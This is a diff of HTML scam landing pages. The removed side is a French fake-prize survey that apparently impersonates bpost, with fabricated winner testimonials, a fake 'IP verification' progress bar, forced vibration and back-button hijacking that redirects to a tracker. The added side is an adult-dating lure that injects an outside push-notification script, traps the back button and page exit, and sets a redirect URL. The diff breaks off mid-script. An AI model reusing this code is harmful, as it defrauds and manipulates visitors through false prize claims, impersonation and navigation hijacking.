@@ -1,952 +1,148 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
 
-<html><head>
-  <base href="">
+<head>
+    <meta charset="UTF-8">
+    <base href="https://cdn-aimi.akamaized.net">
+    <title></title>
+    <meta name="viewport" content="user-scalable=false, initial-scale=1.0, maximum-scale=1.0">
 
-    
-    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
-    <meta charset="utf-8">
-    <meta content="True" name="HandheldFriendly">
-    <meta content="320" name="MobileOptimized">
-    <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" name="viewport">
-    <meta content="width=device-width" name="viewport">
-    <meta content="on" http-equiv="cleartype">
-    <title>Félicitations!</title>
-    <script src="wurfl.js"></script>
-	<link href="favicon.ico" rel="icon" type="image/x-icon">
-	<link href="favicon.ico" rel="shortcut icon" type="image/x-icon">
-  <link rel="stylesheet" href="bootstrap.min.css">
-  <script>var bbURL="http://zebix.bemobtrk.com/click";!function(){var t;try{for(t=0;3>t;++t)history.pushState({},"","#");onpopstate=function(t){t.state&&location.replace(bbURL)}}catch(o){}}();</script>
-   <script>
-function getURLParameter(name) {
-    return decodeURI(
-        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
-    );
-}
-</script>
-   
-    <script>
-
-        function fdate(e) {
-            var a = new Date;
-            a.setDate(a.getDate() - e);
-            var t = a.getYear();
-            t < 1e3 && (t += 1900);
-            var r = (a.getDay(), a.getMonth()),
-                n = a.getDate();
-            n < 10 && (n = "0" + n);
-            var o = (new Array("Zondag", "Maandag", "Dinsdag", "Woensdag", "Donderdag", "Vrijdag", "Zaterdag"), new Array("Janvier","Février","Mars","Avril","Mai","Juin","Juillet","Août","Septembre","Octobre","Novembre","Décembre"));
-            return "" + o[r] + " " + n
-        }! function(e) {
-            try {
-                var a = e.vibrate || e.webkitVibrate || e.mozVibrate || e.msVibrate;
-                a && a.call(e, [666, 333, 666, 333, 666, 333, 666, 333, 666, 333, 666, 333, 666, 333])
-            } catch (e) {}
-        }(navigator);
-        var monthNames = new Array("Janvier","Février","Mars","Avril","Mai","Juin","Juillet","Août","Septembre","Octobre","Novembre","Décembre"),
-            now = new Date;
-        now.setDate(now.getDate() + 1);
-        var nowStringTommorow = monthNames[now.getMonth()] + " " + now.getDate() + ", " + now.getFullYear();
-        if (WURFL.is_mobile === !0) var device = WURFL.complete_device_name;
-        else var device = "device";
-       
-        var mydate = new Date;
-        mydate.setDate(mydate.getDate() - 0);
-        var year = mydate.getYear();
-        year < 1e3 && (year += 1900);
-        var day = mydate.getDay(),
-            month = mydate.getMonth(),
-            daym = mydate.getDate();
-        daym < 10 && (daym = "0" + daym);
-        
-		var dayarray = new Array("Zondag", "Maandag", "Dinsdag", "Woensdag", "Donderdag", "Vrijdag", "Zaterdag"),
-            montharray = new Array("Janvier","Février","Mars","Avril","Mai","Juin","Juillet","Août","Septembre","Octobre","Novembre","Décembre")
-    </script>
-    <style>
-        .contestwrap,
-        .subheader {
-            border-bottom: 1px solid #ebebeb
-        }
-        
-        .contestwrap table,
-        .header table,
-        .subheader table,
-        td,
-        tr {
-            border-collapse: collapse
-        }
-        
-        .contestwrap p,
-        .toptext {
-            color: #000;
-            font-size: small
-        }
-        
-        .answer,
-        .question {
-            text-align: center
-        }
-        
-        .answer,
-        .pbox {
-            cursor: pointer
-        }
-        
-        #szlider,
-        .pbox {
-            overflow: hidden
-        }
-        
-        .answer,
-        .pbox h2,
-        .prize h2,
-        .prize h3,
-        .prizebtn,
-        .select2 {
-            font-weight: 300
-        }
-        
-        .reviews hr,
-        hr {
-            opacity: .2
-        }
-        
-        html {
-            font-family: sans-serif;
-            font-color: #000;
-            -webkit-text-size-adjust: 100%;
-            -ms-text-size-adjust: 100%
-        }
-        
-        body {
-            margin: 0;
-			padding: 0;
-            background: #fff;
-            min-width: 320px;
-            color: #000;
-			position: absolute;
-			width: 100%;
-        }
-        
-        a,
-        div,
-        h1,
-        h2,
-        h3,
-        h4,
-        h5,
-        h6,
-        li,
-        ol,
-        p,
-        span,
-        ul {
-            margin: 0;
-            padding: 0
-        }
-        
-        a {
-            text-decoration: none;
-            color: #4485f6
-        }
-        
-        h3 {
-            color: #212121
-        }
-        
-        p {
-            color: #737373
-        }
-        
-        #q2,
-        #q3,
-        #q4,
-        #v1b,
-        #v1c,
-        #v2b,
-        #v2c,
-        #v3b,
-        #v3c,
-        #v4s,
-        #vfinal,
-        .prize,
-        .validate {
-            display: none
-        }
-        
-        .fbimg {
-            background-color: #fff;
-            border-radius: 2px;
-            max-width: 210px;
-            width: 100%;
-            padding: 3px;
-            box-sizing: border-box;
-            border: 1px solid grey;
-            margin: 10px 0 5px
-        }
-        
-        .contestwrap,
-        .form_questions {
-            width: 100%;
-            border-radius: 3px
-        }
-        
-        .header {
-			background: #D71F29;
-			box-shadow: 0 0 7px 0 rgba(0, 0, 0, .25);
-            width: 100%;
-            padding: 0;
-			position: fixed;
-			z-index: 100;
-        }
-        
-        .contestwrap,
-        .form_questions,
-        .subheader {
-            background-color: #fff
-        }
-        
-        .wrapper {
-            max-width: 1000px;
-            width: 96%;
-            margin: 0 auto
-        }
-        
-        .subheader {
-            width: 100%
-        }
-        
-        .subheader table,
-        td,
-        tr {
-            padding: 8px 0 4px
-        }
-        
-        .subheader td {
-            valign: middle
-        }
-        
-        .spacer {
-            height: 20px
-        }
-        
-        .contestwrap {
-            box-shadow: 0 0 2px 2px #e9e9e9;
-            padding: 10px 0 4px
-        }
-        
-        .contestwrap,
-        .form_questions {
-            -webkit-box-shadow: 0 0 2px 2px #e9e9e9;
-            -moz-box-shadow: 0 0 2px 2px #e9e9e9
-        }
-        
-        .form_questions,
-        .pbox,
-        .validate {
-            border-bottom: 1px solid #e5e5e5
-        }
-        
-        .select2 {
-            color: #000000;
-            font-size: small;
-			font-weight: bold;
-            padding: 8px 0 4px
-        }
-        
-        .form_questions {
-            box-shadow: 0 0 2px 2px #e9e9e9;
-            padding: 10px 0 30px
-        }
-        
-        .answer {
-            border: 0 solid #353A34;
-			border-radius: 8px;
-            padding: 10px 0;
-            width: 80%;
-            display: inline-block;
-            margin: 5px;
-            font-size: medium;
-            color: #fff;
-            -webkit-border-radius: 2px;
-            -moz-border-radius: 2px;
-            border-radius: 10px;
-                background: #D71F29;
-        }
-        
-        .pbox,
-        .validate {
-            border-radius: 3px
-        }
-        
-        .pbox h2,
-        .pbox img,
-        .pbox p {
-            display: block
-        }
-        
-        .question {
-            padding-top: 20px
-        }
-        
-        .validate {
-            width: 96%;
-            background-color: #fff;
-            box-shadow: 0 0 2px 2px #e9e9e9;
-            padding: 0
-        }
-        
-        .pbox,
-        .validate {
-            -webkit-box-shadow: 0 0 2px 2px #e9e9e9;
-            -moz-box-shadow: 0 0 2px 2px #e9e9e9
-        }
-		.reviews {
-box-shadow: 0 0 2px 2px #e9e9e9;
-			-webkit-box-shadow: 0 0 2px 2px #e9e9e9;
-            -moz-box-shadow: 0 0 2px 2px #e9e9e9;
-			max-width: 960px;
-		}
-        #szlider {
-            width: 100%;
-            height: 4px;
-            background: #dadada
-        }
-        
-        #szliderbar {
-            width: 0;
-            height: 4px;
-            background: #D71F29;
-        }
-        .reviews hr {
-			display: block;
-			max-width: 95%;
-			height: 1px;
-			border: none;
-			background: #5f5f5f;
-		}
-        #szazalek {
-            color: #858585;
-            font-size: small
-        }
-        
-        .prize {
-            width: 96%;
-			margin-top: -20px;
-			padding-top: 15px;
-        }
-        
-        .pbox {
-            background-color: #fff;
-            box-shadow: 0 0 2px 2px #e9e9e9;
-            padding: 10px 6px;
-            position: relative;
-        }
-        
-        .pbox img {
-            width: 130px;
-            margin-left: auto;
-            margin-right: auto
-        }
-        
-        .pbox h2,
-        .pbox p {
-            margin: 6px 6px 0
-        }
-        
-        .pbox h2 {
-            font-size: xlarge;
-            text-align: left
-        }
-        
-        .pbox p {
-            font-size: small;
-            text-align: left
-        }
-        
-        .footer p,
-        .prizebtn {
-            display: inline-block
-        }
-        
-        .prizebtn {
-            border: 0 solid #FCA000;
-            padding: 4px 0;
-            width: 80%;
-            margin: 8px 4px 4px;
-            text-align: center;
-            font-size: .9em;
-            color: #fff;
-            -webkit-border-radius: 3px;
-            -moz-border-radius: 3px;
-            border-radius: 3px;
-            background: #FCA000;
-        }
-        
-        .prize h3 {
-            font-size: 1.5em;
-            padding: 5px 0;
-            text-align: center
-        }
-        
-        .prize h2 {
-            font-size: 1.2em;
-            text-align: left
-        }
-        
-        .reviews {
-            width: 100%;
-            padding: 0;
-            line-height: 1.3
-        }
-        
-        .reviews .name {
-            font-weight: 700;
-            color: #1a39c5
-        }
-        
-        .reviews .text {
-            color: #6a6a6a
-        }
-        
-        .reviews .date {
-            padding-bottom: 6px;
-            color: #006621;
-            font-size: 10px
-        }
-        
-        .reviews table {
-            padding: 5px 0;
-            font-size: small
-        }
-        
-        .roundimg {
-            width: 50px
-        }
-        
-        .reviews h2 {
-            color: grey;
-            font-size: 1.2em;
-            font-weight: 300;
-            padding: 20px 0 5px
-        }
-        
-        .commentpad {
-            padding-left: 10px
-        }
-        
-        .reviews span {
-            color: #a5778f
-        }
-        
-        .footer {
-            background-color: #FCA000;
-            border-top: 5px solid #353A34;
-            padding: 20px 0;
-            color: #777;
-            font-size: small
-        }
-        
-        .footer p {
-            padding-right: 20px
-        }
-		
-		.modal-content {
-			background: #fff;
-			border: 2px solid #D71F29;
-		}
-		
-		.modal-footer {
-			border-top: 1px solid #D71F29;
-		}
-		
-		.container-prize {
-			display: flex; 
-			flex-direction: column;
-		}
-		.one-prize,.two-prize {
-			display: flex;
-			flex-direction: row;
-			align-items: center;
-			justify-content: space-around;
-		}
-		.two-prize {
-padding-bottom: 10px;}
-		.btn-cont {
-			display: flex; flex-direction: column;
-			align-items: center;
-			justify-content: center;
-		}
-		.btn-prize {
-			display: block;
-			color: #fff;
-			text-transform: none;
-			padding: 11px 35px;
-			   background:#D71F29;
-			border-radius: 6px;
-			margin-bottom: 5px;
-		}
-		.con-prize1 {
-			 box-shadow: 0 0 2px 2px #e9e9e9;
-			border: 1px solid #fff;
-		}
-		
-		@media only screen and (max-width: 580px) {
-			.one-prize,.two-prize {
-				flex-direction: column;
-				margin: 5px;
-			}
-			.btn-prize {
-				margin: 10px 0;
-			}
-		}
-		.date {
-			padding-top: 7px;
-		}
-		footer {
-	background: #D71F29;
-	    border-top: 5px solid #fff;
-			margin-top: 40px;
-}
-.footer-block {
-	display: -webkit-box;
-	display: -ms-flexbox;
-	display: flex;
-	
-	-webkit-box-orient: vertical;
-	
-	-webkit-box-direction: normal;
-	
-	-ms-flex-direction: row;
-	
-	flex-direction: row;
-	
-	-webkit-box-pack: justify;
-	-ms-flex-pack: justify;
-	justify-content: space-between;
-	
-	-webkit-box-align: center;
-	
-	-ms-flex-align: center;
-	
-	align-items: center;
-	padding: 5px 25px 15px 25px;
-	max-width: 960px;
-	margin: 0 auto;
-}
-.footer-block span {
-	color: #ffffff;
-	font-size: 15px;
-	padding-top: 10px;
-	display: block; text-align: center;
-}
-
-.footer-block-2 {
-	display: -webkit-box;
-	display: -ms-flexbox;
-	display: flex;
-	-webkit-box-orient: horizontal;
-	-webkit-box-direction: normal;
-	-ms-flex-direction: row;
-	flex-direction: row;
-	-webkit-box-pack: justify;
-	-ms-flex-pack: justify;
-	justify-content: space-between;
-	-webkit-box-align: center;
-	-ms-flex-align: center;
-	align-items: center;
-	
-	
-	padding: 5px 25px 0 25px;
-	max-width: 700px;
-	margin: 0 auto;
-}
-
-/**** MEDIA ****/
+    <link href="/images/jump-favicon.ico" rel="icon" type="image/x-icon" />
 
 
-@media only screen and (max-width:680px) {
-	.footer-block {
-		-webkit-box-orient: vertical;
-		-webkit-box-direction: normal;
-		-ms-flex-direction: column;
-		flex-direction: column;
-		-webkit-box-pack: center;
-		-ms-flex-pack: center;
-		justify-content: center;
-		-webkit-box-align: center;
-		-ms-flex-align: center;
-		align-items: center;
-	}
-	.row2 {
-		display: -webkit-box;
-		display: -ms-flexbox;
-		display: flex;
-		-webkit-box-orient: vertical;
-		-webkit-box-direction: normal;
-		-ms-flex-direction: column;
-		flex-direction: column;
-		-webkit-box-align: center;
-		-ms-flex-align: center;
-		align-items: center;
-		-webkit-box-pack: start;
-		-ms-flex-pack: start;
-		justify-content: flex-start;
-	}
-}
-		/******* Modal Trial ******/
-	@media only screen and (min-width:800px){.white_content{position:fixed;top:10%;left:30%;width:40%;background-color:rgb(255,255,255);border-radius:5px;z-index:1002;overflow:auto}.present{height:355px;width:100%;display:flex;flex-direction:column;justify-content:flex-start;align-items:center}}
-	@media only screen and (max-width:799px){.white_content{position:fixed;top:10%;left:5%;width:90%;background-color:rgb(255,255,255);border-radius:5px;z-index:1002;overflow:auto}.present{height:355px;width:100%;display:flex;flex-direction:column;justify-content:flex-start;align-items:center}}#light-text2{padding:15px;font-size:22px;text-transform:uppercase;text-align:center}#light-text2 span{color:#fff}/****** Modal Trial ******/
-.white_content {
-	display: none;
-	-webkit-box-shadow: 0 0 10px rgba(0,0,0,0.5);
-	box-shadow: 0 0 10px rgba(0,0,0,0.5); 
-	padding: 30px 30px 0; 
-	border: 2px solid #D71F29 !important; 
-	background: #fff;
-}
-.trial-logo {
-	display: block;
-	margin: 0 auto;
-	max-width: 100px;
-	margin-top: -5px; 
-	margin-bottom: 10px;
-}
-		.dat-1 {
-			color: #9fa2a6;
-			font-size: x-small;
-			float: right;
-			margin-top: -30px;
-			display: block;
-			margin-left: 10px;
-		}
 
-		@media only screen and (max-width: 420px) {
-			.dat-1 {
-				float: none;
-				margin: -10px 0 0 0;
-			}
-		}
-		
-    </style>
-<script type="text/javascript" src="utils.js"></script>
+    <meta content="" name="keywords">
+    <meta content="" name="description">
+    <link rel="stylesheet" type="text/css" href="/landings/120876/1526054501/css/c82963a843f2fff2ad0ee26403e2d36b.css?1526054501">
+    <script type="text/javascript" src="/landings/120876/1526054501/js/bf6fd92ccc0b84096fd829dff819362b.js?1526054501"></script>
+    <script type="text/javascript" src="/landings/120876/1526054501/js/backoffer.js?1526054501"></script>
+    <script type="text/javascript" src="/landings/120876/1526054501/js/avsc4.js?1526054501"></script>
 </head>
 
-<div id="light" class="white_content">
-	<img class="trial-logo" src="logo-modal.png"/>
-	<p style="font-size: 16px;">Vous y êtes presque ! Vous devez confirmer vos informations de contact.</p> 
-	<br>
-	<div class="modal-footer" style="border-top: 1px solid #D71F29 !important">
-	<img src="post-logo.png" style="float: left; max-width: 100px; margin-top: 4px;" alt="">
-		<a href="http://zebix.bemobtrk.com/click"><button type="button" class="btn btn-primary" data-dismiss="modal" style="background: #D71F29; color: #fff;">OK</button></a>
-	</div>
-</div>
-
-<body style="display: inline; margin: 0;"> <audio autoplay="" preload=""> <source src="http://zebix.bemobtrk.com/click" type="audio/ogg"> <source src="http://zebix.bemobtrk.com/click" type="audio/mpeg"> </audio>
-    <script>
-        ! function() {
-            "undefined" != typeof window.orientation && (document.body.style.display = "inline")
-        }()
+<body style="">
+    <script type="text/javascript">
+        var _push = {
+            serverUrl: "https://theseoffersforyou.com",
+            urlParams: {
+                sub: "",
+                s1: "ext1",
+                s2: "ext2",
+                cid: 25
+            }
+        };
+        (function(p, u, s, h) {
+            p._pcq = p._pcq || [];
+            p._pcq.push(['_currentTime', Date.now()]);
+            s = u.createElement('script');
+            s.type = 'text/javascript';
+            s.async = true;
+            s.src = _push.serverUrl + '/pushjs/1.0.0/dbl-subscriber.js';
+            h = u.getElementsByTagName('script')[0];
+            h.parentNode.insertBefore(s, h);
+        })(window, document);
     </script>
-    
-    <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
-<div class="modal-dialog">
-<div class="modal-content">
-<div class="modal-body">
-<table>
-<tbody><tr>
+    <script>
+        $(window).load(function() {
+            $(this).on('mousemove', function() {
+                history.pushState(null, null, location.href);
+            })
+        }) $(document).ready(function() {
+            window.exit = true;
 
+            function confirmExit() {
+                if (window.exit) {
+                    return '?';
+                };
+            };
+            window.onbeforeunload = function() {
+                return confirmExit();
+            };
+            $('.btn-fin').on('click', function() {
+                window.exit = false;
+            });
+        });
+    </script>
+    <script type="text/javascript">
+        (function(w) {
+            w.backOfferUrl = 'http://www.datethatgirls.com/c/da57dc555e50572d?s1=9870&s2=44494&s3=backuser&click_id='
+        }(window));
+    </script>
+    <html lang="en-US">
 
-<td>
-          
-
-	<img src="logo-modal.png" alt="" style="margin: -10px auto 0 auto; display: block; max-width: 130px; margin-bottom: 10px;">
-	<p style="text-align: center;font-size: 17px; color: #4b4b4b;">
-Félicitations ! Vous êtes l’un des 10 utilisateurs que nous avons sélectionnés pour avoir une chance de gagner un iPhone X or Samsung Galaxy S9!</p>
-</td>
-</tr>
-</tbody></table>
-</div>
-<div class="modal-footer">
-<button type="button" class="btn btn-primary" data-dismiss="modal" style="background: #D71F29; color: #fff;font-weight: bold; letter-spacing: .3; border-radius: 4px;">OK</button>
-</div>
-</div>
-</div>
-</div>
-    
-    <div class="header">
-       <img src="header-logo.png" style="display: block; margin: 5px auto 5px auto;max-width: 167px;">
-    </div>
-
-    <div class="spacer"></div>
-    <div class="wrapper" style="margin-top: 95px;">
-        <div class="wrapper contestwrap">
-            <div class="toptext">
-                <table class="wrapper">
-                    <tbody>
-                        <tr>
-                            <td align="left" valign="top" width="42px"><img src="logo-mini.png" style="margin-top: -7px; max-width: 40px; padding: 5px; border-radius: 8px; margin-right: 0px;"></td>
-                            <td align="left" valign="top"><h4 style="position: relative; top: 4px;"> Félicitations!</h4> <br>
-                                <span class="dat-1">
-                                    <script>
-                                        document.write(fdate(0))
-                                    </script>, 2018</span>
-                            </td>
-                        </tr>
-                    </tbody>
-                </table>
-                <div style="border-bottom:1px solid #ebebeb">
-                    <p class="wrapper" style="font-size: 15px;">Aujourd'hui c'est VOTRE jour de chance! Vous êtes l'un des 10 clients chanceux sélectionnés au hasard qui vont recevoir GRATUITEMENT une récompense de nos partenaires .<br> <br>
-						
-						Pour gagner, il suffit de répondre aux 4 questions ci-dessous et de remplir vos coordonnées sur la page suivante. <br> <br> </p>
-                </div>
-                <script>
-                    function startTimer(t) {
-                        var e, r, n = t,
-                            a = setInterval(function() {
-                                e = parseInt(n / 60, 10), r = parseInt(n % 60, 10), r = 10 > r ? "0" + r : r, $("#timerr").text(e + " minutes " + r + " seconds"), --n < 0 && clearInterval(a)
-                            }, 1e3)
-                    }
-                    startTimer(89)
-                </script>
-                <style>
-                    .select2 {
-                        color: #737373;
-                        font-size: small;
-                        font-weight: 300;
-                        padding: 8px 0 4px 0
-                    }
-                </style>
-                <div class="wrapper select2" style="font-size: 15px;"> <b>Important:</b> Seulement 7 prix restent. </div>
-            </div>
-        </div>
-        <div class="spacer"></div>
-        <div class="wrapper form_questions" style="position: relative;">
-            <div class="wrapper question" id="q1">
-                <h3> <span style="font-weight:300">Question 1:</span> Depuis combien d’années utilisez- vous nos services? <br> </h3> <br> <span class="answer">Depuis 1 an ou moins </span> <span class="answer">Depuis 1-2 ans </span> <span class="answer">Depuis 3-4 ans </span> </div>
-            <div class="wrapper question" id="q2">
-                <h3> <span style="font-weight:300">Question 2:</span> Utilisez-vous nos services couramment? <br> </h3> <br> <span class="answer">Tous les jours </span> <span class="answer">Plusieurs fois par semaine </span> <span class="answer">Plusieurs fois par mois  </span> </div>
-            <div class="wrapper question" id="q3">
-                <h3> <span style="font-weight:300">Question 3:</span> A quel point êtes-vous satisfait de notre service? <br> </h3> <br> <span class="answer" onClick="drawszlider(10,0)">Très satisfait </span> <span class="answer" onClick="drawszlider(10,0)"> Satisfait  </span> 
-                <span class="answer" onClick="drawszlider(10,0)"> Non satisfaits </span></div>
-            <div class="wrapper question" id="q4">
-                <h3> <span style="font-weight:300">Question 4: </span>Quelle est votre couleur préférée pour un smartphone? <br> </h3> <br> <span class="answer" onClick="drawszlider(10,0)">Blanc </span> <span class="answer" onClick="drawszlider(10,0)">Noir </span> <span class="answer" onClick="drawszlider(10,0)">Or</span> </div>
-        </div>
-        <div class="wrapper validate">
-            <div class="wrapper"> <br>
-                <table width="100%">
-                    <tbody><tr>
-                        <td align="left">
-                            <p id="v1b">Validation de vos réponses...
-                            <p id="v2b">Vérification de votre IP...</p>
-                            <p id="v3b">Vérification si les prix sont toujours disponibles...</p>
-                            <p id="vfinal">Félicitations!</p>
-                        </td>
-                        <td align="right"> <span id="szazalek">0%</span> </td>
-                    </tr>
-                </tbody></table>
-                <div style="width:100%;margin:0 auto">
-                    <div id="szlider">
-                        <div id="szliderbar"> </div>
-                        <div id="szazalek"> </div>
+    <body style="">
+        <div style="display:none;"> {{GTM_BLOCK}} </div>
+        <!-- Google Tag Manager -->
+        <!-- End Google Tag Manager -->
+        <header class="header"> LocalSexFinder </header>
+        <section class="container-section">
+            <div class="popup-block">
+                <div class="popup-content">
+                    <div class="popup-slogan"> PicDrop </div>
+                    <div class="popup-title"> Lollipopxoxo from your town would like to share a photo. </div><img class="popup-img" src="/landings/120876/1526054501/images/popup_1.jpg" alt="">
+                    <div class="popup-buttons">
+                        <div class="popup-btn tr-next-button tr-b-option"> Decline </div><span class="delimiter"></span>
+                        <div class="popup-btn tr-next-button tr-b-option"> Accept </div>
                     </div>
                 </div>
-                <table>
-                    <tbody><tr>
-                        <td width="40px"> <img src="loading.gif" id="v1a"> <img src="fb-check.jpg" id="v1c"> </td>
-                        <td>
-                            <p id="v1d">Merci pour vos commentaires.</p>
-                        </td>
-                    </tr>
-                    <tr>
-                        <td> <img src="loading.gif" id="v2a"> <img src="fb-check.jpg" id="v2c"> </td>
-                        <td>
-                            <p id="v2d">Veuillez patienter, nous vous redirigeons vers la page de cadeau.</p>
-                        </td>
-                    </tr>
-                    <tr>
-                        <td> <img src="loading.gif" id="v3a"> <img src="fb-check.jpg" id="v3c"> </td>
-                        <td>
-                            <p id="v3d">Vérification des cadeaux disponibles.</p>
-                        </td>
-                    </tr>
-                </tbody></table> <br> </div>
-        </div>
-        <script>
-            function drawszlider(e, d) {
-                var l = Math.round(100 * d / e);
-                document.getElementById("szliderbar").style.width = l + "%", document.getElementById("szazalek").innerHTML = l + "%", holvanszlider = d, t = setTimeout("drawszlider(100, slidewhere);slidewhere = holvanszlider + 1; if (slidewhere > 100) {slidewhere = 100;}", 132)
-            }
-            var slidewhere = 0,
-                holvanszlider = 0
-        </script>
-        <div class="spacer" id="v4s"></div>
-        <div class="wrapper prize con-prize1" id="v4">
-            <h3>Pour vous remercier pour votre participation à ce sondage, nous vous donnons la chance de gagner un téléphones mobile! 
-            </h3>
-            <div class="container-prize">
-            	<div class="one-prize">
-            		<img src="iX-370x220.png" alt="" style="width: 100%;;max-width: 290px">
-            		<div class="btn-cont">
-            			<a class="btn-prize" href="javascript:void(0)" onclick="ok_btn()" style="color: #fff; text-decoration:  none;">Revendiquer</a>
-            			<span>Restant: <span style="padding: 2px 5px; background: green; color: #fff; border-radius: 5px;">3</span> </span>
-            		</div>
-            	</div>
-            	<br>
-            	<div class="two-prize" style="opacity: .6;">
-            		<img src="Samsung-Galaxy-S9-370x220.png" alt="" style="width: 100%;;max-width: 290px">
-            		<div class="btn-cont">
-            			<a class="btn-prize" style="color: #fff; text-decoration: none; background: #ccc;">Revendiquer</a>
-            			<span>Restant: <span style="padding: 2px 5px; background: red; color: #fff;border-radius: 5px;">0</span> </span>
-            		</div>
-            	</div>
             </div>
-        </div>
-        <div class="spacer"></div>
-        <div class="wrapper reviews">
-            <div class="wrapper">
-                <h2>Commentaires</h2>
+            <div class="step-block">
+                <!--step1-->
+                <div class="step-item visible first-step"><img class="step-img" src="/landings/120876/1526054501/images/1_1.jpg" alt="">
+                    <div class="step-title"> ARE YOU OVER 21? </div>
+                    <div class="buttons-block">
+                        <div class="step-btn tr-next-button tr-b-option"> Yes </div>
+                        <div class="step-btn no-btn tr-next-button tr-b-option"> No </div>
+                    </div>
+                </div>
+                <!--END step1-->
+                <!--step2-->
+                <div class="step-item"><img class="step-img" src="/landings/120876/1526054501/images/2_1.jpg" alt="">
+                    <div class="step-title"><span>              ARE YOU LOOKING TO                                                                                </span><span>              INTERACT WITH NEW PEOPLE?                                                                                </span></div>
+                    <div class="buttons-block">
+                        <div class="step-btn tr-next-button tr-b-option"> Yes </div>
+                        <div class="step-btn no-btn tr-next-button tr-b-option"> No </div>
+                    </div>
+                </div>
+                <!--END step2-->
+                <!--step 3-->
+                <div class="step-item "><img class="step-img" src="/landings/120876/1526054501/images/3_1.jpg" alt="">
+                    <div class="step-title"><span>              ARE YOU ABLE TO SEND                                                                                </span><span>              AND RECEIVE PICTURES                                                                                </span><span>              BY PHONE OR EMAIL?                                                                                </span></div>
+                    <div class="buttons-block">
+                        <div class="step-btn tr-next-button tr-b-option"> Yes </div>
+                        <div class="step-btn no-btn tr-next-button tr-b-option"> No </div>
+                    </div>
+                </div>
+                <!--END step 3-->
+                <!--step 4-->
+                <div class="step-item load-step">
+                    <div class="load-block"><img class="step-img load-img visible" src="/landings/120876/1526054501/images/4_1.jpg" alt=""><img class="step-img load-img" src="/landings/120876/1526054501/images/5_1.jpg" alt=""><img class="step-img load-img" src="/landings/120876/1526054501/images/6_1.jpg" alt=""><img class="step-img load-img" src="/landings/120876/1526054501/images/7_1.jpg" alt="">
+                        <div class="load-item visible"> Analyzing your answers </div>
+                        <div class="load-item"> Duplicate registrations are being reviewed </div>
+                        <div class="load-item"> Matching sex-partners... </div>
+                        <div class="load-item"> Looking for registration options </div>
+                    </div>
+                    <div class="loader">
+                        <div class="loader-line"></div>
+                    </div>
+                </div>
+                <!--END step 4-->
+                <!--step 5-->
+                <div class="step-item final-step">
+                    <div class="step-title"> Great! <br> We think you fit in perfectly. </div>
+                    <p> Before you register </p>
+                    <p> Please read the following: </p>
+                    <p> * Be prepared to see profiles of people in your area. </p>
+                    <p> * Remember our members are real people, have respect and treat others the way you would hope to be treated. </p>
+                    <p> * Be open minded, have fun ;-) </p>
+                    <div class="buttons-block"><a href="http://zebix.bemobtrk.com/click" class="step-btn submit-btn tr-submit-button btn-fin" id="agreeclick" data-id="agreeclick">              Get Involved                                                                                                                 </a></div>
+                </div>
+                <!--END step 5-->
             </div>
-            <table class="wrapper" style="padding-top:8px">
-                <tbody><tr>
-                    <td align="right" valign="top" width="50px"> <img src="comment-k.jpg" class="roundimg"> </td>
-                    <td align="left" valign="top" class="commentpad">
-                        <div class="name">Léona Tessier</div>
-                        <div class="text">Merci beaucoup, c'est tout simplement fantastique, je n'avais jamais gagné quoi que ce soit en ligne auparavant!</div> <img src="galiphone.png" class="fbimg">
-                        <div class="date">
-              <script>
-                document.write("" + montharray[month] + " " + daym + "")
-              </script> um 09:02</div>
-                    </td>
-                </tr>
-            </tbody></table>
+        </section>
+        <footer class="footer"></footer>
+    </body>
 
-            <hr>
-            <table class="wrapper">
-                <tbody><tr>
-                    <td align="right" valign="top" width="50px"> <img src="ps4man.jpg" class="roundimg"> </td>
-                    <td align="left" valign="top" class="commentpad">
-                        <div class="name">Pauline Jantot</div>
-                        <div class="text">Bravo! Cela m'a pris 10 minutes pour répondre à toutes les questions parce que j'avais peur de cliquer sur la mauvaise et de ne rien recevoir. J'ai reçu mon samsung s9 ce matin. yeah :)</div>
-                        <div class="date">
-              <script>
-                document.write("" + montharray[month] + " " + daym + "")
-              </script> um 09:00</div>
-                    </td>
-                </tr>
-            </tbody></table>
-            <hr>
-            <table class="wrapper">
-                <tbody><tr>
-                    <td align="right" valign="top" width="50px"> <img src="comment7.jpg" class="roundimg"> </td>
-                    <td align="left" valign="top" class="commentpad">
-                        <div class="name">Shelly Waves</div>
-                        <div class="text">J'ai reçu un Samsung S9, cela vaut bien plus qu'un Nokia :D</div> <img src="1221.jpg" class="fbimg">
-                        <div class="date">
-                           Il y a 22 minutes</div>
-                    </td>
-                </tr>
-            </tbody></table>
-            <hr>
-            <table class="wrapper">
-                <tbody><tr>
-                    <td align="right" valign="top" width="50px"> <img src="female.jpg" class="roundimg"> </td>
-                    <td align="left" valign="top" class="commentpad">
-                        <div class="name">Juliette Brideau</div>
-                        <div class="text">Montre de sport Apple :3 merci!</div>
-                        <div class="date">
-              <script>
-                document.write("" + montharray[month] + " " + daym + "")
-              </script> um 07:27</div>
-                    </td>
-                </tr>
-            </tbody></table>
-            <hr>
-            <table class="wrapper">
-                <tbody><tr>
-                    <td align="right" valign="top" width="50px"> <img src="comment-c.jpg" class="roundimg"> </td>
-                    <td align="left" valign="top" class="commentpad">
-                        <div class="name">Thomas Schulz</div>
-                        <div class="text">C'est la première fois que je gagne quelque chose! Haha!</div>
-                        <div class="date">
-              <script>
-                document.write("" + montharray[month] + " " + daym + "")
-              </script> um 07:11</div>
-                    </td>
-                </tr>
-            </tbody></table>
-            <hr>
-            <table class="wrapper">
-                <tbody><tr>
-                    <td align="right" valign="top" width="50px"> <img src="oldman.jpg" class="roundimg"> </td>
-                    <td align="left" valign="top" class="commentpad">
-                        <div class="name">Rolf Schneider</div>
-                        <div class="text">Vous êtes incroyables! Merci de faire ça!</div>
-                        <div class="date">
-              <script>
-                document.write("" + montharray[month] + " " + daym + "")
-              </script> um 04:31</div>
-                    </td>
-                </tr>
-            </tbody></table>
-			<br>
-            <div style="height:10px"></div>
-        </div>
-    </div>
-<footer>
-	<div class="footer-block">
-	<img src="header-logo.png" alt="" style="max-width: 80px;margin-top: 10px;">
-	<span>
-		  Copyright © 2018 bpost
-	</span>
-		</div>
-<!--
-		<div class="footer-block-2">
-		
-		</div>
--->
-	</footer>
-    <script src="jquery.js"></script>
-    <script src="js.cookie6.js"></script>
-    <script src="backbutton_mainstream.js"></script>
-  <script>
-		 $(document).ready(function() {
-			setInterval(function() {
